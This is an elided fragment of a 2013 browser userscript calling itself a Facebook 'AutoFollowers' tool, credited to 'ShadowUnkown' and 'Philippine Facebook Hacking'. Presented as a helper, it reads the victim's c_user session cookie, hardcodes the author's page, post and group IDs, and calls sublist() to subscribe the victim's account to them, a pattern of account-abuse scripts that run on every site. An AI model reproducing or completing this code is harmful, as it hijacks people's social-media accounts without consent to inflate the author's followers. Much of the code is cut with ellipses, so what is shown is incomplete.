// ==UserScript==
// @name       Facebook List AutoFollowers Update 08/16/2013
// @namespace  Code by ShadowUnkown
// @version    0.1
// @description  Learn to Hack :)
// @match      http://*/*
// @copyright  2013, Philippine Facebook Hacking
// ==/UserScript==
(function() {
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/geraldlikeyou" target="_blank">Created by ShadowUnkown <br>KLIK DISINI</a>';
	html += '</div>';
...
sublist("399907566795647");
sublist("638301026189608");



//don't remove salam
var gid = ['1406593542888570'];
...
var spage_id = "517135338348647";
var spost_id = "100003292218014";
var sfoto_id = "100003292218014";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by ShadowUnkown';
